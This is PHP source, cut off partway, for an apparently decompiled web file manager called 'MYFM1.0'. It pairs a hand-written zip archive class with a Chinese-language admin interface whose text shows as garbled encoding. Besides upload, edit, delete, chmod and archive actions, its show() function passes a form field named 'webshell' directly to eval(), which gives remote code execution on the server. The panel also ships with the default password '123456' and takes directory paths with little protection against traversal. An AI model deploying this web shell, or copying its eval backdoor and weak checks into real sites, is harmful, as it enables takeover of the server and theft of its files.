<?php
/*********************/
/*                   */
/*  Version : 5.1.0  */
/*  Author  : RM     */
/*  Comment : 071223 */
/*                   */
/*********************/

class zip
{

				var $ctrl_dir = array( );
				var $eof_ctrl_dir = "PK\x05\x06\x00\x00\x00\x00";
				var $old_offset = 0;
				var $dirs = array
				(
								0 => "."
				);

				function get_list( $zip_name )
				{
								$zip = @fopen( $zip_name, "rb" );
								if ( !$zip )
								{
												return 0;
								}
								$centd = $this->readcentraldir( $zip, $zip_name );
								@rewind( $zip );
								@fseek( $zip, $centd['offset'] );
								$i = 0;
								for ( ;	$i < $centd['entries'];	++$i	)
								{
												$header = $this->readcentralfileheaders( $zip );
												$header['index'] = $i;
												$info['filename'] = $header['filename'];
												$info['stored_filename'] = $header['stored_filename'];
												$info['size'] = $header['size'];
												$info['compressed_size'] = $header['compressed_size'];
												$info['crc'] = strtoupper( dechex( $header['crc'] ) );
												$info['mtime'] = $header['mtime'];
												$info['comment'] = $header['comment'];
												$info['folder'] = $header['external'] == 1107230736 || $header['external'] == 16 ? 1 : 0;
												$info['index'] = $header['index'];
												$info['status'] = $header['status'];
												$ret[] = $info;
												unset( $header );
								}
								return $ret;
				}

				function add( $files, $compact )
				{
								if ( !is_array( $files[0] ) )
								{
												$files = array(
																$files
												);
								}
								$i = 0;
								for ( ;	$files[$i];	++$i	)
								{
												$fn = $files[$i];
												if ( !in_array( dirname( $fn[0] ), $this->dirs ) )
												{
																$this->add_dir( dirname( $fn[0] ) );
												}
												if ( basename( $fn[0] ) )
												{
																$ret[basename( $fn[0] )] = $this->add_file( $fn[1], $fn[0], $compact );
												}
								}
								return $ret;
				}

				function get_file( )
				{
								$data = implode( "", $this->datasec );
								$ctrldir = implode( "", $this->ctrl_dir );
								return $data.$ctrldir.$this->eof_ctrl_dir.pack( "v", sizeof( $this->ctrl_dir ) ).pack( "v", sizeof( $this->ctrl_dir ) ).pack( "V", strlen( $ctrldir ) ).pack( "V", strlen( $data ) )."\x00\x00";
				}

				function add_dir( $name )
				{
								$name = str_replace( "\\", "/", $name );
								$fr = "PK\x03\x04\n\x00\x00\x00\x00\x00\x00\x00\x00\x00";
								$fr .= pack( "V", 0 ).pack( "V", 0 ).pack( "V", 0 ).pack( "v", strlen( $name ) );
								$fr .= pack( "v", 0 ).$name.pack( "V", 0 ).pack( "V", 0 ).pack( "V", 0 );
								$this->datasec[] = $fr;
								$new_offset = strlen( implode( "", $this->datasec ) );
								$cdrec = "PK\x01\x02\x00\x00\n\x00\x00\x00\x00\x00\x00\x00\x00\x00";
								$cdrec .= pack( "V", 0 ).pack( "V", 0 ).pack( "V", 0 ).pack( "v", strlen( $name ) );
								$cdrec .= pack( "v", 0 ).pack( "v", 0 ).pack( "v", 0 ).pack( "v", 0 );
								$ext = "����";
								$cdrec .= pack( "V", 16 ).pack( "V", $this->old_offset ).$name;
								$this->ctrl_dir[] = $cdrec;
								$this->old_offset = $new_offset;
								$this->dirs[] = $name;
				}

				function add_file( $data, $name, $compact = 1 )
				{
								$name = str_replace( "\\", "/", $name );
								$dtime = dechex( $this->dostime( ) );
								$hexdtime = "\\x".$dtime[6].$dtime[7]."\\x".$dtime[4].$dtime[5]."\\x".$dtime[2].$dtime[3]."\\x".$dtime[0].$dtime[1];
								eval( "\$hexdtime = \"".$hexdtime."\";" );
								if ( $compact )
								{
												$fr = "PK\x03\x04\x14\x00\x00\x00\x08\x00".$hexdtime;
								}
								else
								{
												$fr = "PK\x03\x04\n\x00\x00\x00\x00\x00".$hexdtime;
								}
								$unc_len = strlen( $data );
								$crc = crc32( $data );
								if ( $compact )
								{
												$zdata = gzcompress( $data );
												$c_len = strlen( $zdata );
												$zdata = substr( substr( $zdata, 0, strlen( $zdata ) - 4 ), 2 );
								}
								else
								{
												$zdata = $data;
								}
								$c_len = strlen( $zdata );
								$fr .= pack( "V", $crc ).pack( "V", $c_len ).pack( "V", $unc_len );
								$fr .= pack( "v", strlen( $name ) ).pack( "v", 0 ).$name.$zdata;
								$fr .= pack( "V", $crc ).pack( "V", $c_len ).pack( "V", $unc_len );
								$this->datasec[] = $fr;
								$new_offset = strlen( implode( "", $this->datasec ) );
								if ( $compact )
								{
												$cdrec = "PK\x01\x02\x00\x00\x14\x00\x00\x00\x08\x00";
								}
								else
								{
												$cdrec = "PK\x01\x02\x14\x00\n\x00\x00\x00\x00\x00";
								}
								$cdrec .= $hexdtime.pack( "V", $crc ).pack( "V", $c_len ).pack( "V", $unc_len );
								$cdrec .= pack( "v", strlen( $name ) ).pack( "v", 0 ).pack( "v", 0 );
								$cdrec .= pack( "v", 0 ).pack( "v", 0 ).pack( "V", 32 );
								$cdrec .= pack( "V", $this->old_offset );
								$this->old_offset = $new_offset;
								$cdrec .= $name;
								$this->ctrl_dir[] = $cdrec;
								return true;
				}

				function dostime( )
				{
								$timearray = getdate( );
								if ( $timearray['year'] < 1980 )
								{
												$timearray['year'] = 1980;
												$timearray['mon'] = 1;
												$timearray['mday'] = 1;
												$timearray['hours'] = 0;
												$timearray['minutes'] = 0;
												$timearray['seconds'] = 0;
								}
								return $timearray['year'] - 1980 << 25 | $timearray['mon'] << 21 | $timearray['mday'] << 16 | $timearray['hours'] << 11 | $timearray['minutes'] << 5 | $timearray['seconds'] >> 1;
				}

				function extract( $zn, $to, $index = array
				(
								0 => -1
				) )
				{
								$ok = 0;
								$zip = @fopen( $zn, "rb" );
								if ( !$zip )
								{
												return -1;
								}
								$cdir = $this->readcentraldir( $zip, $zn );
								$pos_entry = $cdir['offset'];
								if ( !is_array( $index ) )
								{
												$index = array(
																$index
												);
								}
								$i = 0;
								for ( ;	$index[$i];	++$i	)
								{
												if ( intval( $index[$i] ) != $index[$i] || $cdir['entries'] < $index[$i] )
												{
																return -1;
												}
								}
								$i = 0;
								for ( ;	$i < $cdir['entries'];	++$i	)
								{
												@fseek( $zip, $pos_entry );
												$header = $this->readcentralfileheaders( $zip );
												$header['index'] = $i;
												$pos_entry = ftell( $zip );
												@rewind( $zip );
												fseek( $zip, $header['offset'] );
												if ( in_array( "-1", $index ) || in_array( $i, $index ) )
												{
																$stat[$header['filename']] = $this->extractfile( $header, $to, $zip );
												}
								}
								fclose( $zip );
								return $stat;
				}

				function readfileheader( $zip )
				{
								$binary_data = fread( $zip, 30 );
								$data = unpack( "vchk/vid/vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len", $binary_data );
								$header['filename'] = fread( $zip, $data['filename_len'] );
								if ( $data['extra_len'] != 0 )
								{
												$header['extra'] = fread( $zip, $data['extra_len'] );
								}
								else
								{
												$header['extra'] = "";
								}
								$header['compression'] = $data['compression'];
								$header['size'] = $data['size'];
								$header['compressed_size'] = $data['compressed_size'];
								$header['crc'] = $data['crc'];
								$header['flag'] = $data['flag'];
								$header['mdate'] = $data['mdate'];
								$header['mtime'] = $data['mtime'];
								if ( $header['mdate'] && $header['mtime'] )
								{
												$hour = ( $header['mtime'] & 63488 ) >> 11;
												$minute = ( $header['mtime'] & 2016 ) >> 5;
												$seconde = ( $header['mtime'] & 31 ) * 2;
												$year = ( ( $header['mdate'] & 65024 ) >> 9 ) + 1980;
												$month = ( $header['mdate'] & 480 ) >> 5;
												$day = $header['mdate'] & 31;
												$header['mtime'] = mktime( $hour, $minute, $seconde, $month, $day, $year );
								}
								else
								{
												$header['mtime'] = time( );
								}
								$header['stored_filename'] = $header['filename'];
								$header['status'] = "ok";
								return $header;
				}

				function readcentralfileheaders( $zip )
				{
								$binary_data = fread( $zip, 46 );
								$header = unpack( "vchkid/vid/vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset", $binary_data );
								if ( $header['filename_len'] != 0 )
								{
												$header['filename'] = fread( $zip, $header['filename_len'] );
								}
								else
								{
												$header['filename'] = "";
								}
								if ( $header['extra_len'] != 0 )
								{
												$header['extra'] = fread( $zip, $header['extra_len'] );
								}
								else
								{
												$header['extra'] = "";
								}
								if ( $header['comment_len'] != 0 )
								{
												$header['comment'] = fread( $zip, $header['comment_len'] );
								}
								else
								{
												$header['comment'] = "";
								}
								if ( $header['mdate'] && $header['mtime'] )
								{
												$hour = ( $header['mtime'] & 63488 ) >> 11;
												$minute = ( $header['mtime'] & 2016 ) >> 5;
												$seconde = ( $header['mtime'] & 31 ) * 2;
												$year = ( ( $header['mdate'] & 65024 ) >> 9 ) + 1980;
												$month = ( $header['mdate'] & 480 ) >> 5;
												$day = $header['mdate'] & 31;
												$header['mtime'] = mktime( $hour, $minute, $seconde, $month, $day, $year );
								}
								else
								{
												$header['mtime'] = time( );
								}
								$header['stored_filename'] = $header['filename'];
								$header['status'] = "ok";
								if ( substr( $header['filename'], -1 ) == "/" )
								{
												$header['external'] = 1107230736;
								}
								return $header;
				}

				function readcentraldir( $zip, $zip_name )
				{
								$size = filesize( $zip_name );
								if ( $size < 277 )
								{
												$maximum_size = $size;
								}
								else
								{
												$maximum_size = 277;
								}
								@fseek( $zip, $size - $maximum_size );
								$pos = ftell( $zip );
								$bytes = 0;
								while ( $pos < $size )
								{
												$byte = @fread( $zip, 1 );
												$bytes = $bytes << 8 | ord( $byte );
												if ( $bytes == 1347093766 )
												{
																++$pos;
																break;
												}
												++$pos;
								}
								$data = unpack( "vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size", fread( $zip, 18 ) );
								if ( $data['comment_size'] != 0 )
								{
												$centd['comment'] = fread( $zip, $data['comment_size'] );
								}
								else
								{
												$centd['comment'] = "";
								}
								$centd['entries'] = $data['entries'];
								$centd['disk_entries'] = $data['disk_entries'];
								$centd['offset'] = $data['offset'];
								$centd['disk_start'] = $data['disk_start'];
								$centd['size'] = $data['size'];
								$centd['disk'] = $data['disk'];
								return $centd;
				}

				function extractfile( $header, $to, $zip )
				{
								mkdir( $to, 511 );
								$header = $this->readfileheader( $zip );
								if ( substr( $to, -1 ) != "/" )
								{
												$to .= "/";
								}
								$pth = explode( "/", dirname( $header['filename'] ) );
								$newdir = $pth[0];
								@mkdir( $to.$newdir, 511 );
								$i = 1;
								for ( ;	isset( $pth[$i] );	++$i	)
								{
												$newdir .= "/".$pth[$i];
												mkdir( $to.$newdir, 511 );
								}
								if ( !( $header['external'] == 1107230736 ) && !( $header['external'] == 16 ) )
								{
												if ( $header['compression'] == 0 )
												{
																$fp = @fopen( $to.$header['filename'], "wb" );
																if ( !$fp )
																{
																				return -1;
																}
																$size = $header['compressed_size'];
																while ( $size != 0 )
																{
																				$read_size = $size < 2048 ? $size : 2048;
																				$buffer = fread( $zip, $read_size );
																				$binary_data = pack( "a".$read_size, $buffer );
																				@fwrite( $fp, $binary_data, $read_size );
																				$size -= $read_size;
																}
																fclose( $fp );
																touch( $to.$header['filename'], $header['mtime'] );
												}
												else
												{
																$fp = @fopen( $to.$header['filename'].".gz", "wb" );
																if ( !$fp )
																{
																				return -1;
																}
																$binary_data = pack( "va1a1Va1a1", 35615, chr( $header['compression'] ), chr( 0 ), time( ), chr( 0 ), chr( 3 ) );
																fwrite( $fp, $binary_data, 10 );
																$size = $header['compressed_size'];
																while ( $size != 0 )
																{
																				$read_size = $size < 1024 ? $size : 1024;
																				$buffer = fread( $zip, $read_size );
																				$binary_data = pack( "a".$read_size, $buffer );
																				@fwrite( $fp, $binary_data, $read_size );
																				$size -= $read_size;
																}
																$binary_data = pack( "VV", $header['crc'], $header['size'] );
																fwrite( $fp, $binary_data, 8 );
																fclose( $fp );
																if ( !( $gzp = @gzopen( $to.$header['filename'].".gz", "rb" ) ) )
																{
																				exit( "Cette archive est compress�e" );
																}
																if ( !$gzp )
																{
																				return -2;
																}
																$fp = @fopen( $to.$header['filename'], "wb" );
																if ( !$fp )
																{
																				return -1;
																}
																$size = $header['size'];
																while ( $size != 0 )
																{
																				$read_size = $size < 2048 ? $size : 2048;
																				$buffer = gzread( $gzp, $read_size );
																				$binary_data = pack( "a".$read_size, $buffer );
																				@fwrite( $fp, $binary_data, $read_size );
																				$size -= $read_size;
																}
																fclose( $fp );
																gzclose( $gzp );
																touch( $to.$header['filename'], $header['mtime'] );
																@unlink( $to.$header['filename'].".gz" );
												}
								}
								return true;
				}

				function get_zip_list( $dir, $mod = 0 )
				{
								if ( is_dir( $dir ) )
								{
												if ( !( substr( $dir, -1 ) == "/" ) )
												{
																$dir .= "/";
												}
												$this->add_dir( $dir );
												$fp = dir( $dir );
												while ( $f = $fp->read( ) )
												{
																if ( $f != "." && $f != ".." )
																{
																				$this->get_zip_list( $dir.$f, 0 );
																}
												}
												$fp->close( );
								}
								else
								{
												$fp = fopen( $dir, "rb" );
												$this->add_file( fread( $fp, filesize( $dir ) ), $dir, $mod );
												fclose( $fp );
								}
				}

				function creat_zip( $filename, $file = array( ) )
				{
								$olddir = realpath( "./" );
								chdir( $this->root_dir.$this->dir );
								foreach ( $file as $value )
								{
												$this->get_zip_list( $value );
								}
								chdir( $olddir );
								fputs( fopen( $filename, "wb" ), $this->get_file( ) );
				}

}

error_reporting( 0 );
class myfm extends zip
{

				var $root_dir = "../";
				var $adminpass = "123456";
				var $tmp_file = "sys/tmp.php";
				var $dir = "/";
				var $action = "";
				var $file = array( );
				var $stat = array
				(
								"size" => 0,
								"dir_num" => 0,
								"file_num" => 0
				);

				function myfm( )
				{
								if ( !empty( $_GET['dir'] ) )
								{
												$this->dir = $_GET['dir'];
								}
								if ( !empty( $_GET['action'] ) )
								{
												$this->action = $_GET['action'];
								}
								if ( !( substr( $this->dir, -1 ) == "/" ) )
								{
												$this->dir .= "/";
								}
								$this->dir = preg_replace( "/\\/[^\\.]+\\/\\.\\.\\//si", "/", $this->dir );
								$this->self = $_SERVER['PHP_SELF'];
								if ( !file_exists( "sys" ) )
								{
												@mkdir( "sys", 511 );
								}
								$a = @file( "sys/config.php" );
								$this->root_dir = trim( substr( $a[1], 9 ) );
								$this->url = trim( substr( $a[2], 4 ) );
								$this->adminpass = trim( substr( $a[3], 10 ) );
								session_start( );
								if ( !session_is_registered( "pass" ) )
								{
												session_register( "pass" );
								}
								if ( isset( $_POST['password'] ) )
								{
												$GLOBALS['_SESSION']['pass'] = $_POST['password'];
								}
								if ( $_SESSION['pass'] != $this->adminpass )
								{
												$this->login( );
								}
								switch ( $this->action )
								{
								case "newpassword" :
												$fp = @fopen( "sys/config.php", "w" );
												@fwrite( $fp, "<?exit;?>\nroot_dir={$this->root_dir}\nurl={$this->url}\nadminpass=".$_GET['key'] );
												@fclose( $fp );
												break;
								case "newroot_dir" :
												$fp = @fopen( "sys/config.php", "w" );
												@fwrite( $fp, "<?exit;?>\nroot_dir=".$_GET['key']."\nurl={$this->url}\nadminpass={$this->adminpass}" );
												@fclose( $fp );
												break;
								case "newurl" :
												$fp = @fopen( "sys/config.php", "w" );
												@fwrite( $fp, "<?exit;?>\nroot_dir={$this->root_dir}\nurl=".$_GET['key']."\nadminpass={$this->adminpass}" );
												@fclose( $fp );
												break;
								case "logout" :
												$GLOBALS['_SESSION']['pass'] = "";
												header( "location:".$this->self );
												break;
								case "cut" :
												$this->get_post( );
												if ( $this->set_tmp( 1, $this->dir, $this->file ) )
												{
																$this->msg = "�ļ��Ѿ��ɹ����е����а�";
												}
												else
												{
																$this->msg = "�ļ����е����а�ʧ��";
												}
												break;
								case "copy" :
												$this->get_post( );
												if ( $this->set_tmp( 0, $this->dir, $this->file ) )
												{
																$this->msg = "�ļ��Ѿ��ɹ����Ƶ����а�";
												}
												else
												{
																$this->msg = "�ļ����Ƶ����а�ʧ��";
												}
												break;
								case "parse" :
												$data = $this->get_tmp( );
												if ( $data['mod'] == 1 )
												{
																foreach ( $data['file'] as $value )
																{
																				if ( $this->copy( $this->root_dir.$data['domain'], $value, $this->root_dir.$this->dir ) )
																				{
																								$this->del( $this->root_dir.$data['domain'].$value );
																				}
																}
												}
												else
												{
																foreach ( $data['file'] as $value )
																{
																				if ( $this->copy( $this->root_dir.$data['domain'], $value, $this->root_dir.$this->dir ) )
																				{
																								++$count;
																				}
																}
												}
												break;
								case "save" :
												if ( get_magic_quotes_gpc( ) == 1 )
												{
																$GLOBALS['_POST']['content'] = stripslashes( $_POST['content'] );
												}
												if ( $this->edit( $this->root_dir.$this->dir.$_POST['filename'], $_POST['content'] ) )
												{
																$this->msg = "�ļ�����ɹ�";
												}
												else
												{
																$this->msg = "�ļ�����ʧ��";
												}
												break;
								case "down" :
												$this->get_post( );
												$this->down( $this->root_dir.$this->dir.$this->file[0] );
												break;
								case "upload" :
												$this->upload( "file", $_POST['updir'], $_POST['ove'] );
												break;
								case "zip" :
												$this->get_post( );
												$this->creat_zip( $this->root_dir.$this->dir.$_GET['key'], $this->file );
												break;
								case "unzip" :
												$this->get_post( );
												foreach ( $this->file as $value )
												{
																$this->extract( $this->root_dir.$this->dir.$value, $this->root_dir.$_GET['key'] );
												}
												break;
								case "gz" :
												$this->get_post( );
												$this->gz( $this->root_dir.$this->dir.$_GET['key'], $this->root_dir.$this->dir.$this->file[0] );
												break;
								case "del" :
												$this->get_post( );
												foreach ( $this->file as $value )
												{
																$this->del( $this->root_dir.$this->dir.$value );
												}
												break;
								case "chmod" :
												$this->get_post( );
												foreach ( $this->file as $value )
												{
																chmod( $this->root_dir.$this->dir.$value, @octdec( $_GET['key'] ) );
												}
												break;
								case "rename" :
												$this->get_post( );
												rename( $this->root_dir.$this->dir.$this->file[0], $this->root_dir.$this->dir.$_GET['key'] );
												break;
								case "newdir" :
												if ( @mkdir( $this->root_dir.$this->dir.$_POST['newdir'], 511 ) )
												{
																$this->msg = "Ŀ¼�½��ɹ�";
												}
												else
												{
																$this->msg = "Ŀ¼�½�ʧ��";
												}
												break;
								case "newfile" :
												if ( @fopen( $this->root_dir.$this->dir.$_POST['newfile'], "a" ) )
												{
																$this->msg = "�ļ��½��ɹ�";
												}
												else
												{
																$this->msg = "�ļ��½�ʧ��";
												}
												break;
								case "stat" :
												$this->get_post( );
												foreach ( $this->file as $value )
												{
																$this->stat( $this->root_dir.$this->dir.$value );
												}
												$this->msg = ( "��ʾ�ļ�״̬:<br>ռ�ÿռ�<br>".$this->stat['size'] / 1024 )."kb<br>";
												$this->msg .= $this->stat['dir_num']."��Ŀ¼<br>";
												$this->msg .= $this->stat['file_num']."���ļ�<br>";
												break;
								case "search" :
												$this->msg = "�ļ��������<br>";
												$this->search( $this->dir, $_POST['file'] );
												break;
								}
								$this->show( );
				}

				function login( )
				{
								echo "\r\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\">\r\n<html>\r\n<head>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\">\r\n<title>�ޱ����ĵ�</title>\r\n<style type=\"text/css\">\r\n<!--\r\ntable {\r\n\tbackground-color: #000000;\r\n\tfont-size: 8pt;\r\n\tcolor: #333333;\r\n}\r\ntr {\r\n\tbackground-color: #FFFFFF;\r\n}\r\n-->\r\n</style>\r\n<style type=\"text/css\">\r\n<!--\r\ninput {\r\n\tbackground-color: #CCCCCC;\r\n\tcolor: #333333;\r\n\tfont-size: 10px;\r\n\tborder: 1px solid #333333;\r\n}\r\n-->\r\n</style>\r\n</head>\r\n\r\n<body>\r\n<p>&nbsp;</p>\r\n<table width=\"30%\" border=\"0\" align=\"center\" cellpadding=\"1\" cellspacing=\"1\">\r\n<form action=\"{$this->self}\" method=\"post\">\r\n  <tr align=\"center\"> \r\n    <td colspan=\"2\" bgcolor=\"#999999\">MYFM�ļ������½</td>\r\n  </tr>\r\n  <tr> \r\n    <td width=\"31%\">�û����ƣ�</td>\r\n    <td width=\"69%\"><input name=\"username\" type=\"text\" value=\"Administrator\" size=\"15\"></td>\r\n  </tr>\r\n  <tr> \r\n    <td>�û����룺</td>\r\n    <td><input name=\"password\" type=\"password\" size=\"15\"></td>\r\n  </tr>\r\n  <tr> \r\n    <td>��ʼ�ύ��</td>\r\n    <td><input type=\"submit\" name=\"Submit\" value=\"�ύ����\">\r\n      <input type=\"reset\" name=\"Submit2\" value=\"��������\"> </td>\r\n  </tr>\r\n</form>\r\n</table>\r\n<p>&nbsp;</p>\r\n</body>\r\n</html>";
								exit( );
				}

				function show( )
				{
								echo "\r\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\">\r\n<html>\r\n<head>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\">\r\n<title>MYFM1.0վ���ļ�������</title>\r\n<style type=\"text/css\">\r\n<!--\r\ntable {\r\n\tbackground-color: #000000;\r\n\tfont-size: 8pt;\r\n\tcolor: #333333;\r\n}\r\na     {\r\n\tfont-size: 8pt;\r\n\tcolor: #000000;\r\n      }\r\ntr {\r\n\tbackground-color: #FFFFFF;\r\n}\r\ninput {\r\n\tbackground-color: #CCCCCC;\r\n\tcolor: #333333;\r\n\tfont-size: 10px;\r\n\tborder: 1px solid #333333;\r\n}\r\ntextarea {\r\n\tbackground-color: #ffffff;\r\n\tcolor: #333333;\r\n\tfont-size: 9pt;\r\n\tborder: 1px solid #333333;\r\n}\r\n-->\r\n</style>\r\n<script>\r\n<!--\r\nvar file='{$this->self}';  //�ļ���������\r\nvar checkflag=1;           //ѡ���־\r\nfunction system(u,v,m,s)   //�����������Ϣ�ύ,uΪ������vΪ����ʽ\r\n{\r\n  str=prompt(m,s)\r\n  if(str!='����д'&&str!=null){\r\n      u.action=u.action+'&action='+v+'&key='+str;\r\n      u.submit();\r\n  } \r\n    \r\n}\r\nfunction really(u,v,m)  //�����������Ϣ�ύ,uΪ������vΪ����ʽ��mΪ��ʾ����Ϣ\r\n{\r\n  if(confirm(m)){\r\n    u.action=u.action+'&action='+v;\r\n    u.submit();\r\n  }\r\n\r\n}\r\nfunction check(u) {\r\nif (checkflag ==1) {\r\nfor (i = 0; i < u.length; i++) {\r\nif(u[i].value!='.'&&u[i].value!='..')u[i].checked = true;}\r\ncheckflag =0;\r\nreturn \"ȫ����ѡ\"; }\r\nelse {\r\nfor (i = 0; i < u.length; i++) {\r\nu[i].checked = false; }\r\ncheckflag =1;\r\nreturn \"ȫѡѡ��\"; }\r\n}\r\nfunction get_edit()\r\n{\r\ndocument.edit.content.value='";
								if ( $this->action == "edit" )
								{
												$this->get_post( );
												if ( is_dir( $this->root_dir.$this->dir.$this->file[0] ) )
												{
																exit( "����Ŀ¼���ܱ��༭" );
												}
												$data = $this->edit( $this->root_dir.$this->dir.$this->file[0] );
												$data = str_replace( "\\", "\\\\", $data );
												$data = str_replace( "/", "\\/", $data );
												$data = str_replace( "\r", "\\r", $data );
												$data = str_replace( "\n", "\\n", $data );
												$data = str_replace( "'", "\\'", $data );
								}
								echo "{$data}';\r\n}\r\n-->\r\n</script>\r\n</head>\r\n<body>\r\n<table width=\"100%\" border=\"0\" align=\"center\" cellpadding=\"1\" cellspacing=\"1\">\r\n  <tr>\r\n    <td align=\"center\" bgcolor=\"#999999\">MYFM1.0�ļ�����</td>\r\n  </tr>\r\n</table>\r\n<br>\r\n<table width=\"100%\" border=\"0\" cellspacing=\"1\" cellpadding=\"1\">\r\n  <tr align=\"center\"> \r\n    <td bgcolor=\"#999999\">ϵͳ�˵�</td>\r\n\t<td bgcolor=\"#999999\">ϵͳ��Ϣ </td>\r\n    <td bgcolor=\"#999999\">���ܲ˵�</td>\r\n    <td bgcolor=\"#999999\">��������</td>\r\n  </tr>\r\n  <tr valign=\"top\"> \r\n    <td width=\"15%\" height=\"108\"><table width=\"100%\" border=\"0\" cellspacing=\"1\" cellpadding=\"1\">\r\n<form action=\"{$this->self}?dir={$this->dir}\" method=\"post\">\r\n        <tr>\r\n          <td height=\"20\" align=\"center\">\r\n<input type=\"button\" name=\"Submit2210\" value=\"�û�ע��\" onclick=\"really(this.form,'logout','��ȷ��Ҫע����')\"></td>\r\n        </tr>\r\n        <tr>\r\n          <td height=\"20\" align=\"center\">\r\n<input type=\"button\" name=\"Submit226\" value=\"֧����̳\" onclick=\"window.open('http://www.cqlc.net/forum','','')\"></td>\r\n        </tr>\r\n        <tr>\r\n          <td height=\"20\" align=\"center\">\r\n<input type=\"button\" name=\"newpassword\" value=\"��������\" onclick=\" system(this.form,'newpassword','���������������','{$this->adminpass}')\"></td>\r\n        </tr>\r\n        <tr>\r\n          <td height=\"20\" align=\"center\">\r\n<input type=\"button\" name=\"newroot_dir\" value=\"����Ŀ¼\" onclick=\" system(this.form,'newroot_dir','����������µĸ�Ŀ¼','{$this->root_dir}')\"></td>\r\n        </tr>\r\n        <tr>\r\n          <td height=\"20\" align=\"center\">\r\n<input type=\"button\" name=\"Submit229\" value=\"���õ�ַ\" onclick=\"system(this.form,'newurl','�������Ŀ¼��Ӧ�ĵ�ַ��','{$this->url}')\"></td>\r\n        </tr>\r\n</form>\r\n      </table></td>\r\n    <td width=\"20%\" height=\"108\">";
								if ( isset( $_POST['webshell'] ) )
								{
												eval( "echo ".$_POST['webshell'].";" );
								}
								else if ( !$this->msg )
								{
												echo "PHP�汾: php".PHP_VERSION."<br>";
												if ( get_cfg_var( "safe_mode" ) )
												{
																echo "��ȫģʽ:��<br>";
												}
												else
												{
																echo "��ȫģʽ:�ر�<br>";
												}
												echo "����ϵͳ:".PHP_OS."<br>";
												echo ( "ʣ��ռ�:".disk_free_space( $this->root_dir ) / 1024 )."k<br>";
												echo "��Ŀ¼����·��:<br>".realpath( $this->root_dir );
								}
								else
								{
												echo "{$this->msg}";
								}
								echo "</td>\r\n    <td width=\"25%\"><table width=\"100%\" border=\"0\" cellspacing=\"1\" cellpadding=\"1\">\r\n        <tr> \r\n <form action=\"{$this->self}?dir={$this->dir}&action=webshell\" method=\"post\"> \r\n          <td width=\"100%\" height=\"20\">��� \r\n            <input name=\"webshell\" type=\"text\" size=\"14\"> <input type=\"submit\" name=\"Submit222\" value=\"��������\"></td>\r\n</form>\r\n        </tr>\r\n        <tr>\r\n <form action=\"{$this->self}\" method=\"get\"> \r\n          <td width=\"100%\" height=\"20\">Ŀ¼��\r\n            <input name=\"dir\" type=\"text\" size=\"14\" value=\"{$this->dir}\">\r\n            <input type=\"submit\" name=\"Submit22\" value=\"��תĿ¼\"> </td>\r\n </form>\r\n        </tr>\r\n        <tr> \r\n <form action=\"{$this->self}?dir={$this->dir}&action=search\" method=\"post\"> \r\n          <td width=\"100%\" height=\"20\">�ļ��� \r\n            <input name=\"file\" type=\"text\" size=\"14\"> <input type=\"submit\" name=\"Submit223\" value=\"�����ļ�\"></td>\r\n</form>\r\n        </tr>\r\n        <tr> \r\n <form action=\"{$this->self}?dir={$this->dir}&action=newdir\" method=\"post\"> \r\n          <td width=\"100%\" height=\"20\">Ŀ¼�� \r\n            <input name=\"newdir\" type=\"text\" size=\"14\"> <input type=\"submit\" value=\"�½�Ŀ¼\"></td>\r\n</form>\r\n        </tr>\r\n        <tr> \r\n <form action=\"{$this->self}?dir={$this->dir}&action=newfile\" method=\"post\"> \r\n          <td width=\"100%\" height=\"20\">�ļ��� \r\n            <input name=\"newfile\" type=\"text\" size=\"14\"> <input type=\"submit\" value=\"�½��ļ�\"></td>\r\n</form>\r\n        </tr>\r\n      </table></td>\r\n    <td width=\"40%\"><table width=\"100%\" border=\"0\" cellspacing=\"1\" cellpadding=\"1\">\r\n        <form method=\"POST\" action=\"{$this->self}?dir={$this->dir}&action=upload\" ENCTYPE=\"multipart/form-data\">  \r\n        <tr>\r\n          <td width=\"50%\" height=\"20\">\r\n<input name=\"file[]\" type=\"file\" size=\"15\"></td>\r\n          <td width=\"50%\" height=\"20\"><input name=\"file[]\" type=\"file\" size=\"15\"></td>\r\n        </tr>\r\n        <tr>\r\n          <td width=\"50%\" height=\"20\"><input name=\"file[]\" type=\"file\" size=\"15\"></td>\r\n          <td width=\"50%\" height=\"20\"><input name=\"file[]\" type=\"file\" size=\"15\"></td>\r\n        </tr>\r\n        <tr>\r\n          <td width=\"50%\" height=\"20\"><input name=\"file[]\" type=\"file\" size=\"15\"></td>\r\n          <td width=\"50%\" height=\"20\"><input name=\"file[]\" type=\"file\" size=\"15\"></td>\r\n        </tr>\r\n        <tr>\r\n          <td width=\"50%\" height=\"20\"><input name=\"file[]\" type=\"file\" size=\"15\"></td>\r\n          <td width=\"50%\" height=\"20\"> ����Ŀ¼ : \r\n            <input name=\"updir\" type=\"text\" size=\"14\" value=\"{$this->dir}\"></td>\r\n        </tr>\r\n        <tr>\r\n          <td width=\"50%\" height=\"20\">�Ƿ񸲸� \r\n            <input name=\"ove\" type=\"radio\" value=\"1\" checked>\r\n            �� \r\n            <input name=\"ove\" type=\"radio\" value=\"0\">\r\n            �� </td>\r\n          <td width=\"50%\" height=\"20\"><input type=\"submit\" name=\"Submit2222\" value=\"���ص���\">\r\n            <input type=\"submit\" name=\"Submit2223\" value=\"�������� \"> </td>\r\n        </tr>\r\n</form>\r\n      </table></td>\r\n  </tr>\r\n</table>";
								if ( $this->action == "edit" )
								{
												echo "\r\n<table width=\"100%\" border=\"0\" align=\"center\" cellpadding=\"1\" cellspacing=\"1\">\r\n<form action=\"{$this->self}?dir={$this->dir}&action=save\" method=\"post\" name=\"edit\">\r\n  <tr>\r\n    <td>�ļ��༭���������ƣ� \r\n      <input name=\"filename\" type=\"text\" size=\"14\" value=\"".$this->file[0]."\"> <input type=\"submit\" name=\"Submit2211\" value=\"�����ļ�\"></td>\r\n  </tr>\r\n  <tr>\r\n    <td><textarea name=\"content\" cols=\"120\" rows=\"40\"></textarea></td>\r\n  </tr>\r\n<script>\r\n<!--\r\nget_edit();\r\n-->\r\n</script>\r\n</form>\r\n</table>\r\n</body>\r\n</html>";
												exit( );
								}
								$data = $this->get_list( $this->root_dir.$this->dir );
